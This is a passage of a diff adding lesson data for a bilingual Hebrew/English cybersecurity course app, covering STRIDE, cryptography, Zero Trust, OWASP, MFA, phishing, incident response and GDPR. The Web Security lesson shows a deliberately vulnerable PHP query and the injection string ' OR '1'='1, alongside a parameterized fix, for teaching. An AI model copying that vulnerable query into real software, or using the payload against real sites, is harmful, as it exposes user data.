+<div class="cheat-item"><span class="cheat-key">MD5/SHA-1</span><span class="cheat-val">❌ שבורים</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 סיכום — אבטחת רשתות</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">Firewalls</div>
+<div class="cheat-item"><span class="cheat-key">Stateless</span><span class="cheat-val">לפי IP/Port בלבד</span></div>
+<div class="cheat-item"><span class="cheat-key">Stateful</span><span class="cheat-val">עוקב connections</span></div>
+<div class="cheat-item"><span class="cheat-key">NGFW/WAF</span><span class="cheat-val">DPI + Application layer</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Zero Trust</div>
+<div class="cheat-item"><span class="cheat-key">עיקרון</span><span class="cheat-val">לעולם אל תסמוך</span></div>
+<div class="cheat-item"><span class="cheat-key">Verify</span><span class="cheat-val">MFA + Device health</span></div>
+<div class="cheat-item"><span class="cheat-key">Least Privilege</span><span class="cheat-val">מינימום הרשאות</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 סיכום — Web Security</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">OWASP Top Threats</div>
+<div class="cheat-item"><span class="cheat-key">A01</span><span class="cheat-val">Broken Access Control</span></div>
+<div class="cheat-item"><span class="cheat-key">A03</span><span class="cheat-val">Injection (SQLi, XSS)</span></div>
+<div class="cheat-item"><span class="cheat-key">A07</span><span class="cheat-val">Auth Failures</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">הגנות</div>
+<div class="cheat-item"><span class="cheat-key">SQLi</span><span class="cheat-val">Parameterized queries</span></div>
+<div class="cheat-item"><span class="cheat-key">XSS</span><span class="cheat-val">CSP + encoding</span></div>
+<div class="cheat-item"><span class="cheat-key">CSRF</span><span class="cheat-val">SameSite + CSRF token</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 סיכום — Authentication</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">MFA חוזק</div>
+<div class="cheat-item"><span class="cheat-key">SMS OTP</span><span class="cheat-val">⚠️ SIM swap risk</span></div>
+<div class="cheat-item"><span class="cheat-key">TOTP App</span><span class="cheat-val">✅ טוב</span></div>
+<div class="cheat-item"><span class="cheat-key">Hardware Key</span><span class="cheat-val">✅ מצוין</span></div>
+<div class="cheat-item"><span class="cheat-key">Passkey</span><span class="cheat-val">✅ עתיד</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">JWT</div>
+<div class="cheat-item"><span class="cheat-key">Header</span><span class="cheat-val">alg + typ</span></div>
+<div class="cheat-item"><span class="cheat-key">Payload</span><span class="cheat-val">לא מוצפן!</span></div>
+<div class="cheat-item"><span class="cheat-key">Signature</span><span class="cheat-val">HMAC(h.p, secret)</span></div>
+<div class="cheat-item"><span class="cheat-key">alg:none attack</span><span class="cheat-val">❌ תמיד לאמת alg</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 סיכום — Malware & Social Eng</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">Phishing Types</div>
+<div class="cheat-item"><span class="cheat-key">Phishing</span><span class="cheat-val">מיילים המוניים</span></div>
+<div class="cheat-item"><span class="cheat-key">Spear</span><span class="cheat-val">ממוקד לאדם</span></div>
+<div class="cheat-item"><span class="cheat-key">Whaling</span><span class="cheat-val">נגד C-level</span></div>
+<div class="cheat-item"><span class="cheat-key">Vishing</span><span class="cheat-val">טלפוני</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Ransomware</div>
+<div class="cheat-item"><span class="cheat-key">Initial Access</span><span class="cheat-val">Phishing/RDP</span></div>
+<div class="cheat-item"><span class="cheat-key">Lateral Movement</span><span class="cheat-val">פשיטה ברשת</span></div>
+<div class="cheat-item"><span class="cheat-key">Double Extortion</span><span class="cheat-val">הצפנה + גנבה</span></div>
+<div class="cheat-item"><span class="cheat-key">הגנה #1</span><span class="cheat-val">Patch management</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 סיכום — Incident Response</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">NIST IR Phases</div>
+<div class="cheat-item"><span class="cheat-key">1</span><span class="cheat-val">Preparation</span></div>
+<div class="cheat-item"><span class="cheat-key">2</span><span class="cheat-val">Detection & Analysis</span></div>
+<div class="cheat-item"><span class="cheat-key">3</span><span class="cheat-val">Containment</span></div>
+<div class="cheat-item"><span class="cheat-key">4</span><span class="cheat-val">Eradication</span></div>
+<div class="cheat-item"><span class="cheat-key">5</span><span class="cheat-val">Recovery</span></div>
+<div class="cheat-item"><span class="cheat-key">6</span><span class="cheat-val">Lessons Learned</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Order of Volatility</div>
+<div class="cheat-item"><span class="cheat-key">1st</span><span class="cheat-val">CPU registers</span></div>
+<div class="cheat-item"><span class="cheat-key">2nd</span><span class="cheat-val">Network connections</span></div>
+<div class="cheat-item"><span class="cheat-key">3rd</span><span class="cheat-val">RAM memory</span></div>
+<div class="cheat-item"><span class="cheat-key">4th</span><span class="cheat-val">Disk / Logs</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 סיכום — Compliance & Risk</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">GDPR</div>
+<div class="cheat-item"><span class="cheat-key">72 שעות</span><span class="cheat-val">דיווח על breach</span></div>
+<div class="cheat-item"><span class="cheat-key">קנס מקסימלי</span><span class="cheat-val">4% מחזור / 20M€</span></div>
+<div class="cheat-item"><span class="cheat-key">Right to Erasure</span><span class="cheat-val">מחיקת נתונים</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Risk Strategies</div>
+<div class="cheat-item"><span class="cheat-key">Mitigate</span><span class="cheat-val">הפחתה</span></div>
+<div class="cheat-item"><span class="cheat-key">Transfer</span><span class="cheat-val">ביטוח</span></div>
+<div class="cheat-item"><span class="cheat-key">Accept</span><span class="cheat-val">קבלה מודעת</span></div>
+<div class="cheat-item"><span class="cheat-key">Avoid</span><span class="cheat-val">הימנעות</span></div>
+</div>
+</div>`
+  ]
+},
+
+en:{
+  dir:'ltr',lang:'en',langBtn:'🇮🇱 HE',sbLabel:'Chapters',
+  names:['Intro to Security','Cryptography','Network Security','Web Security','Authentication & IAM','Malware & Social Eng','Incident Response','Compliance & Risk'],
+  tags:['// Chapter 00','// Chapter 01','// Chapter 02','// Chapter 03','// Chapter 04','// Chapter 05','// Chapter 06','// Chapter 07'],
+  descs:[
+    'CIA Triad, threat modeling, attack surface and defense in depth — the foundation every security professional needs',
+    'Symmetric, asymmetric, hashing, PKI and TLS — how encryption protects our data',
+    'Firewalls, IDS/IPS, VPN, Zero Trust and segmentation — network security end to end',
+    'OWASP Top 10, XSS, SQL Injection, CSRF and CSP — how attackers break into web apps',
+    'MFA, OAuth 2.0, JWT, RBAC and Zero Trust — identity and permissions in the modern world',
+    'Phishing, ransomware, APT, social engineering — how most breaches start',
+    'Detection, containment, eradication, recovery — how to respond to an attack in real time',
+    'GDPR, ISO 27001, risk management, DPIA — security as a business and legal requirement'
+  ],
+  tabs:['📖 Learn','🎯 Quiz','🛠️ Lab','🎮 Game','📋 Summary'],
+  tabKeys:['learn','quiz','lab','game','cheat'],
+  gameTitle:'THREAT QUIZ',gameDesc:'Answer as fast as possible. Every correct answer = +10 points.',
+  gameStart:'▶ Start',gameSeconds:'seconds',gameQuestions:'questions',gameXP:'+10 XP',
+  gameAgain:'🔄 Again',gameToCheat:'📋 Summary →',
+  quizPrev:'← Prev',quizNext:'Next →',quizSubmit:'Submit ✓',
+  quizExplain:'💡 Explanation:',quizToLab:'Go to Lab →',quizAgain:'🔄 Try Again',
+  resultLabels:['Try again!','Almost...','Good!','Well done!','Excellent!','Perfect! 🛡️'],
+  lbTitle:'// Leaderboard',labExplain:'💡 Explanation:',
+  points:'pts',of:'of',question:'Question',
+  optLetters:['A','B','C','D'],playerName:'You',unknownPlayer:'Player',pct:'% correct',
+  learn:[`
+<div class="did-you-know">💡 <strong>Did you know?</strong> 95% of security breaches start with human error — not sophisticated zero-days. The human factor is the biggest vulnerability in any organization.</div>
+
+<div class="section-title">CIA Triad — three pillars of security</div>
+<p class="prose">Every security decision is measured against three values: Confidentiality, Integrity, and Availability. They often conflict with each other.</p>
+<div class="grid-3">
+<div class="card"><div class="card-icon">🔒</div><div class="card-title">Confidentiality</div><div class="card-body">Only authorized users can access data. Encryption, access control, need-to-know. Example: medical, financial records.</div></div>
+<div class="card"><div class="card-icon">✅</div><div class="card-title">Integrity</div><div class="card-body">Data wasn't modified without authorization. Hashing, digital signatures, audit logs. Example: signed software update.</div></div>
+<div class="card"><div class="card-icon">⚡</div><div class="card-title">Availability</div><div class="card-body">System is available to authorized users when needed. Redundancy, DDoS protection, backups. Example: hospital 24/7.</div></div>
+</div>
+<div class="callout callout-warn"><strong>⚠️ The built-in tension:</strong> Maximum security hurts availability. Locking everything down = secure, but nobody can work. Every security policy balances the three.</div>
+
+<div class="section-title">Threat Modeling — think like an attacker</div>
+<p class="prose">Before defending, understand what you're defending. STRIDE is Microsoft's threat identification model:</p>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>Threat</th><th>Meaning</th><th>Example</th><th>Defense</th></tr></thead><tbody>
+<tr><td><strong>S</strong>poofing</td><td>Impersonation</td><td>Email phishing</td><td>MFA, SPF/DKIM</td></tr>
+<tr><td><strong>T</strong>ampering</td><td>Data modification</td><td>Man-in-the-Middle</td><td>HTTPS, signing</td></tr>
+<tr><td><strong>R</strong>epudiation</td><td>Denying action</td><td>"I didn't send that"</td><td>Audit logs, timestamps</td></tr>
+<tr><td><strong>I</strong>nformation Disclosure</td><td>Data exposure</td><td>Data breach</td><td>Encryption, ACL</td></tr>
+<tr><td><strong>D</strong>enial of Service</td><td>Disruption</td><td>DDoS attack</td><td>Rate limiting, CDN</td></tr>
+<tr><td><strong>E</strong>levation of Privilege</td><td>Privilege escalation</td><td>sudo exploit</td><td>Least privilege</td></tr>
+</tbody></table></div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 Real Incident: Colonial Pipeline — May 2021</div>
+  <div class="incident-body">
+    Colonial Pipeline — the largest fuel pipeline in the US — was shut down by ransomware. Initial access: an old VPN account with a leaked password, no MFA. $5.5 million ransom paid.<br><br>
+    <strong>Lessons:</strong> (1) MFA on every VPN — mandatory. (2) Unused old accounts — delete them. (3) Network segmentation — IT and OT (operational technology) should never communicate directly.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>Did you know?</strong> When you send a WhatsApp message, it's encrypted with the Signal protocol. WhatsApp itself cannot read your messages. That's End-to-End Encryption — even the company that built the app has no access to your content.</div>
+
+<div class="section-title">Symmetric Encryption — one key</div>
+<p class="prose">AES (Advanced Encryption Standard) is the symmetric standard. Same key encrypts and decrypts. Fast and efficient, but requires pre-shared key distribution.</p>
+<div class="grid-2">
+<div class="card"><div class="card-icon">🔑</div><div class="card-title">AES-256</div><div class="card-body">128-bit block, 256-bit key. Used in TLS, BitLocker, encrypted ZIP. <strong>Very fast in hardware.</strong> NSA approves for CLASSIFIED TOP SECRET.</div></div>
+<div class="card"><div class="card-icon">⚡</div><div class="card-title">Modes of Operation</div><div class="card-body"><strong>ECB</strong> — insecure, patterns visible.<br><strong>CBC</strong> — good but not parallelizable.<br><strong>GCM</strong> — recommended: fast + Authenticated Encryption.</div></div>
+</div>
+
+<div class="section-title">Hashing — one-way fingerprint</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>Algorithm</th><th>Output</th><th>Status</th><th>Use</th></tr></thead><tbody>
+<tr><td>MD5</td><td>128 bit</td><td><span class="threat-badge badge-critical">Broken</span></td><td>Not for security at all</td></tr>
+<tr><td>SHA-1</td><td>160 bit</td><td><span class="threat-badge badge-critical">Broken</span></td><td>Deprecated</td></tr>
+<tr><td>SHA-256</td><td>256 bit</td><td><span class="threat-badge badge-low">Secure</span></td><td>Git, certificates</td></tr>
+<tr><td>bcrypt</td><td>184 bit</td><td><span class="threat-badge badge-low">Secure</span></td><td>Passwords only</td></tr>
+<tr><td>Argon2</td><td>variable</td><td><span class="threat-badge badge-low">Best</span></td><td>Passwords — recommended</td></tr>
+</tbody></table></div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 Real Incident: SHA-1 Collision — Google SHAttered (2017)</div>
+  <div class="incident-body">
+    In 2017, Google demonstrated that SHA-1 is completely broken: they created two different PDF files with the same SHA-1 hash. An attacker could create a malicious document with an identical hash to a legitimate one.<br><br>
+    Chrome, Firefox, and CA/Browser Forum banned SHA-1 entirely. Cost: 6,500 CPU-years, 110 GPU-years — feasible for well-funded adversaries.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>Did you know?</strong> When you connect to a coffee shop WiFi, all your traffic passes through their router. Without HTTPS and VPN, the shop owner (or anyone connected to the same network) can see everything you're doing.</div>
+
+<div class="section-title">Firewalls — network guardians</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">🔥</div><div class="card-title">Stateless Firewall</div><div class="card-body">Inspects each packet by IP/Port independently. Fast, but no context. Doesn't detect: port scanning, IP spoofing, fragmented packets.</div></div>
+<div class="card"><div class="card-icon">🧠</div><div class="card-title">Stateful Firewall</div><div class="card-body">Tracks connections. Knows that ACK without prior SYN = suspicious. The vast majority of modern firewalls.</div></div>
+<div class="card"><div class="card-icon">🔍</div><div class="card-title">NGFW / WAF</div><div class="card-body">Deep Packet Inspection, Application Awareness, built-in IPS, SSL Inspection. WAF protects specifically web applications.</div></div>
+<div class="card"><div class="card-icon">🕵️</div><div class="card-title">IDS vs IPS</div><div class="card-body"><strong>IDS</strong> = Intrusion Detection — detects and alerts.<br><strong>IPS</strong> = Intrusion Prevention — detects <em>and blocks</em>. Inline IPS can block legitimate traffic.</div></div>
+</div>
+
+<div class="section-title">Zero Trust — "never trust, always verify"</div>
+<p class="prose">Old model: "everything inside the network is safe." Zero Trust: <strong>trust nobody, inside or outside the network</strong>, without explicit authentication and authorization.</p>
+<div class="flow-row">
+  <div class="flow-step"><div class="flow-step-icon">👤</div><div class="flow-step-label">Verify Identity<br>MFA always</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">📱</div><div class="flow-step-label">Check Device<br>Health, MDM</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🔐</div><div class="flow-step-label">Least Privilege<br>minimum access</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">📊</div><div class="flow-step-label">Monitor All<br>Continuous</div></div>
+</div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 Real Incident: SolarWinds Supply Chain Attack — 2020</div>
+  <div class="incident-body">
+    Russian hackers (APT29/Cozy Bear) infiltrated SolarWinds and planted a backdoor in the Orion software update. 18,000 organizations installed the infected update, including Microsoft, Intel, CISA, and the Treasury Department.<br><br>
+    <strong>Why Zero Trust would have helped:</strong> The backdoor created lateral movement inside the network — with Zero Trust and micro-segmentation, that movement between systems would have been blocked and immediately detected.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>Did you know?</strong> The OWASP Top 10 costs about $3 billion in damages annually. SQL Injection — discovered in 1998 — is still in the Top 10. The oldest vulnerability in the book is still relevant in 2024.</div>
+
+<div class="section-title">OWASP Top 10 — 2021</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>#</th><th>Category</th><th>Severity</th><th>Example</th></tr></thead><tbody>
+<tr><td>A01</td><td>Broken Access Control</td><td><span class="threat-badge badge-critical">Critical</span></td><td>Accessing another user's profile</td></tr>
+<tr><td>A02</td><td>Cryptographic Failures</td><td><span class="threat-badge badge-critical">Critical</span></td><td>HTTP instead of HTTPS, MD5 for passwords</td></tr>
+<tr><td>A03</td><td>Injection (SQL, XSS)</td><td><span class="threat-badge badge-critical">Critical</span></td><td>SELECT * FROM users WHERE id='$id'</td></tr>
+<tr><td>A04</td><td>Insecure Design</td><td><span class="threat-badge badge-high">High</span></td><td>No rate limiting on login</td></tr>
+<tr><td>A05</td><td>Security Misconfiguration</td><td><span class="threat-badge badge-high">High</span></td><td>Admin panel open to the internet</td></tr>
+</tbody></table></div>
+
+<div class="section-title">SQL Injection — the classic vulnerability</div>
+<pre class="code-block"><code><span class="comment"># Vulnerable code (PHP)</span>
+$query = "SELECT * FROM users WHERE user='" . $_GET['user'] . "'";
+
+<span class="comment"># Attacker sends: ' OR '1'='1</span>
+<span class="comment"># Query becomes:</span>
+SELECT * FROM users WHERE user='' <span class="key">OR '1'='1'</span>
+<span class="comment"># Result: all users returned!</span>
+
+<span class="comment"># ✅ Fix: Parameterized Queries</span>
+$stmt = $pdo->prepare("SELECT * FROM users WHERE user = <span class="val">?</span>");
+$stmt->execute([$_GET['user']]);
+<span class="comment"># Input treated as data, not SQL code</span></code></pre>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 Real Incident: British Airways — 2018, 500K credit cards</div>
+  <div class="incident-body">
+    The Magecart group planted a malicious script on British Airways' payment page that filtered payment data to an external server. The breach: changing 22 lines of JavaScript. The script ran for 2 weeks before detection.<br><br>
+    <strong>What would have prevented it:</strong> Content-Security-Policy (CSP) blocking scripts from unauthorized sources. Subresource Integrity (SRI) to verify third-party scripts. BA received a £183M GDPR fine.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>Did you know?</strong> When you log into Spotify with your Google account, Google doesn't tell Spotify your password. It sends an encrypted "voucher" saying "I confirm this user is legitimate." That's OAuth 2.0 — the protocol running most "Login with Google/Facebook" in the world.</div>
+
+<div class="section-title">Authentication vs Authorization</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">🪪</div><div class="card-title">Authentication — who are you?</div><div class="card-body">Identity verification: password, biometrics, certificate. <strong>Something you know, have, or are.</strong></div></div>
+<div class="card"><div class="card-icon">🔐</div><div class="card-title">Authorization — what can you do?</div><div class="card-body">Permissions after identification. RBAC, ABAC, ACL. "Admin sees all, User sees only their own."</div></div>
+</div>
+
+<div class="section-title">MFA Strength Comparison</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>Factor</th><th>Example</th><th>Strength</th><th>Weakness</th></tr></thead><tbody>
+<tr><td>SMS OTP</td><td>Code via SMS</td><td><span class="threat-badge badge-medium">Medium</span></td><td>SIM swapping, SS7 attack</td></tr>
+<tr><td>TOTP App</td><td>Google Authenticator</td><td><span class="threat-badge badge-low">Good</span></td><td>Real-time phishing</td></tr>
+<tr><td>Hardware Key</td><td>YubiKey, FIDO2</td><td><span class="threat-badge badge-low">Excellent</span></td><td>Cost, physical loss</td></tr>
+<tr><td>Passkey</td><td>Face ID, biometric</td><td><span class="threat-badge badge-low">Excellent</span></td><td>New, partial support</td></tr>
+</tbody></table></div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 Real Incident: Okta Breach — 2023</div>
+  <div class="incident-body">
+    Identity provider Okta — used for SSO at thousands of companies — suffered a breach that exposed customer data including BeyondTrust, Cloudflare, and 1Password. Access: a support ticket system that had access to production systems.<br><br>
+    <strong>Lesson:</strong> Identity providers are "keys to the kingdom" — compromising them means access to all customers. Zero Trust, minimum permissions for support systems, and multi-party approval for sensitive operations are essential.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>Did you know?</strong> 91% of cyber attacks start with a phishing email. The best antivirus in the world doesn't protect an employee who clicks a link in an email that looks like it's from their manager.</div>
+
+<div class="section-title">Phishing — from email to breach</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">🎣</div><div class="card-title">Regular Phishing</div><div class="card-body">Mass emails in large volumes. "Your bank was hacked, click here." Low effort, low success rate.</div></div>
+<div class="card"><div class="card-icon">🎯</div><div class="card-title">Spear Phishing</div><div class="card-body">Targeted at a specific person. Name, role, personal details. "Hi Ariel, I saw you're in R&D..." Much higher success rate.</div></div>
+<div class="card"><div class="card-icon">🐳</div><div class="card-title">Whaling</div><div class="card-body">Spear phishing against C-level executives. CEO Fraud: "I'm the CFO, need an urgent $2M transfer."</div></div>
+<div class="card"><div class="card-icon">📞</div><div class="card-title">Vishing / Smishing</div><div class="card-body">Voice phishing (phone) and SMS phishing. "I'm from IT, need your password for an urgent reset."</div></div>
+</div>
+
+<div class="callout callout-danger"><strong>🚨 Double Extortion:</strong> Groups like LockBit and REvil don't just encrypt — they also steal data and threaten to publish it if you don't pay. A good backup protects from encryption, but not from publication.</div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 Real Incident: WannaCry — May 2017, 200,000 machines in 150 countries</div>
+  <div class="incident-body">
+    WannaCry used EternalBlue — a leaked NSA exploit — targeting an SMBv1 vulnerability in Windows. NHS (UK) was hit: thousands of surgeries cancelled, £92M in damage. Renault stopped production lines. FedEx lost $300M.<br><br>
+    <strong>The vulnerability:</strong> Microsoft released a patch 2 months before the attack. Organizations that didn't update — got hit. <strong>Patch management = the most important protection.</strong>
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>Did you know?</strong> The average MTTR (Mean Time To Respond) to a security breach is 207 days to detect and another 73 days to contain — 280 days total. An attacker can sit in your network for 9 months before being discovered.</div>
+
+<div class="section-title">NIST Incident Response Framework</div>
+<div class="flow-row">
+  <div class="flow-step"><div class="flow-step-icon">🔍</div><div class="flow-step-label">Preparation<br>Plan ahead</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🚨</div><div class="flow-step-label">Detection<br>Identify incident</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🔒</div><div class="flow-step-label">Containment<br>Isolate immediately</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🧹</div><div class="flow-step-label">Eradication<br>Full cleanup</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🔄</div><div class="flow-step-label">Recovery<br>Restore operations</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">📝</div><div class="flow-step-label">Lessons Learned</div></div>
+</div>
+
+<div class="callout callout-warn"><strong>⚠️ Order of Volatility — preserve evidence in this order:</strong> CPU registers → Network connections → Running processes → RAM → Disk → Logs. Always preserve volatile data first — it disappears on reboot.</div>
+
+<pre class="code-block"><code><span class="comment"># Linux forensics — first response commands</span>
+date                          <span class="comment"># timestamp of investigation</span>
+w && who                      <span class="comment"># who is logged in NOW</span>
+ps auxf                       <span class="comment"># all running processes</span>
+netstat -tulnap               <span class="comment"># open connections</span>
+find / -mtime -1 -type f 2>/dev/null <span class="comment"># files changed 24h</span>
+last && lastb                 <span class="comment"># login history + failures</span></code></pre>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 Real Incident: Equifax — 2017, 147M Americans</div>
+  <div class="incident-body">
+    Equifax discovered the breach on July 29, 2017, but attackers had been inside since May 13 — 76 days of lateral movement, gradually stealing data. Why it wasn't detected: SSL inspection wasn't enabled, so encrypted traffic with an expired certificate wasn't inspected.<br><br>
+    <strong>IR lessons:</strong> (1) Monitor outbound traffic for volume anomalies. (2) Enable SSL inspection. (3) Network segmentation — a DB with 147M people shouldn't be accessible from the web tier.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>Did you know?</strong> GDPR has imposed fines of over €4 billion since 2018. The largest: Meta — €1.2 billion in 2023. Security is no longer just a technical matter — it's direct business exposure.</div>
+
+<div class="section-title">GDPR — what every organization must know</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">⏱️</div><div class="card-title">72 Hours</div><div class="card-body">Mandatory breach notification to regulators within 72 hours of discovery. If data subjects are affected — notify them too.</div></div>
+<div class="card"><div class="card-icon">🗑️</div><div class="card-title">Right to Erasure</div><div class="card-body">Anyone can request deletion of all their data. "The right to be forgotten." Technical challenge: backups, logs, replicas.</div></div>
+<div class="card"><div class="card-icon">💰</div><div class="card-title">Fines</div><div class="card-body">Up to 4% of global annual turnover, or €20M — whichever is higher. Not less than a regular operational fine.</div></div>
+<div class="card"><div class="card-icon">📋</div><div class="card-title">DPIA</div><div class="card-body">Data Protection Impact Assessment — risk assessment before processing high-risk data. E.g., facial recognition, health data.</div></div>
+</div>
+
+<div class="section-title">Risk Management Strategies</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>Strategy</th><th>Meaning</th><th>When?</th><th>Example</th></tr></thead><tbody>
+<tr><td><strong>Mitigate</strong></td><td>Reduce the risk</td><td>When cost is justified</td><td>Implementing MFA</td></tr>
+<tr><td><strong>Transfer</strong></td><td>Transfer the risk</td><td>Cyber insurance</td><td>Cyber Insurance policy</td></tr>
+<tr><td><strong>Accept</strong></td><td>Accept the risk</td><td>Defense cost > damage</td><td>Small legacy system</td></tr>
+<tr><td><strong>Avoid</strong></td><td>Avoid the risk</td><td>Risk is too high</td><td>Don't store CC numbers</td></tr>
+</tbody></table></div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 Real Incident: Meta — 2023, €1.2 billion GDPR fine</div>
+  <div class="incident-body">
+    The largest GDPR fine in history: the Irish regulator fined Meta for transferring European users' data to the US without adequate protection mechanisms.<br><br>
+    <strong>The implication for every org:</strong> EU-to-US data transfers require Standard Contractual Clauses (SCCs) or Adequacy Decision. "The data is in an American cloud" isn't enough. Privacy by Design and Data Minimization are not optional.
+  </div>
+</div>`
+  ],
+  cheat:[
+`<div class="callout callout-success"><strong>📋 Summary — Intro to Security</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">CIA Triad</div>
+<div class="cheat-item"><span class="cheat-key">Confidentiality</span><span class="cheat-val">ACL, encryption</span></div>
+<div class="cheat-item"><span class="cheat-key">Integrity</span><span class="cheat-val">hash, signing</span></div>
+<div class="cheat-item"><span class="cheat-key">Availability</span><span class="cheat-val">redundancy, DDoS</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">STRIDE</div>
+<div class="cheat-item"><span class="cheat-key">Spoofing</span><span class="cheat-val">Impersonation</span></div>
+<div class="cheat-item"><span class="cheat-key">Tampering</span><span class="cheat-val">Data modification</span></div>
+<div class="cheat-item"><span class="cheat-key">Repudiation</span><span class="cheat-val">Denying action</span></div>
+<div class="cheat-item"><span class="cheat-key">Info Disclosure</span><span class="cheat-val">Data exposure</span></div>
+<div class="cheat-item"><span class="cheat-key">DoS</span><span class="cheat-val">Service disruption</span></div>
+<div class="cheat-item"><span class="cheat-key">Elevation of Priv</span><span class="cheat-val">Privilege escalation</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 Summary — Cryptography</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">Symmetric</div>
+<div class="cheat-item"><span class="cheat-key">AES-256-GCM</span><span class="cheat-val">Recommended for data</span></div>
+<div class="cheat-item"><span class="cheat-key">One key</span><span class="cheat-val">encrypt + decrypt</span></div>
+<div class="cheat-item"><span class="cheat-key">Very fast</span><span class="cheat-val">hardware + software</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Hashing</div>
+<div class="cheat-item"><span class="cheat-key">SHA-256/3</span><span class="cheat-val">Files, certificates</span></div>
+<div class="cheat-item"><span class="cheat-key">bcrypt/Argon2</span><span class="cheat-val">Passwords only</span></div>
+<div class="cheat-item"><span class="cheat-key">MD5/SHA-1</span><span class="cheat-val">❌ Broken</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 Summary — Network Security</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">Firewalls</div>
+<div class="cheat-item"><span class="cheat-key">Stateless</span><span class="cheat-val">By IP/Port only</span></div>
+<div class="cheat-item"><span class="cheat-key">Stateful</span><span class="cheat-val">Tracks connections</span></div>
+<div class="cheat-item"><span class="cheat-key">NGFW/WAF</span><span class="cheat-val">DPI + Application layer</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Zero Trust</div>
+<div class="cheat-item"><span class="cheat-key">Principle</span><span class="cheat-val">Never trust, always verify</span></div>
+<div class="cheat-item"><span class="cheat-key">Verify</span><span class="cheat-val">MFA + Device health</span></div>
+<div class="cheat-item"><span class="cheat-key">Least Privilege</span><span class="cheat-val">Minimum permissions</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 Summary — Web Security</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">OWASP Top Threats</div>
+<div class="cheat-item"><span class="cheat-key">A01</span><span class="cheat-val">Broken Access Control</span></div>
+<div class="cheat-item"><span class="cheat-key">A03</span><span class="cheat-val">Injection (SQLi, XSS)</span></div>
+<div class="cheat-item"><span class="cheat-key">A07</span><span class="cheat-val">Auth Failures</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Defenses</div>
+<div class="cheat-item"><span class="cheat-key">SQLi</span><span class="cheat-val">Parameterized queries</span></div>
+<div class="cheat-item"><span class="cheat-key">XSS</span><span class="cheat-val">CSP + encoding</span></div>
+<div class="cheat-item"><span class="cheat-key">CSRF</span><span class="cheat-val">SameSite + CSRF token</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 Summary — Authentication</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">MFA Strength</div>
+<div class="cheat-item"><span class="cheat-key">SMS OTP</span><span class="cheat-val">⚠️ SIM swap risk</span></div>
+<div class="cheat-item"><span class="cheat-key">TOTP App</span><span class="cheat-val">✅ Good</span></div>
+<div class="cheat-item"><span class="cheat-key">Hardware Key</span><span class="cheat-val">✅ Excellent</span></div>
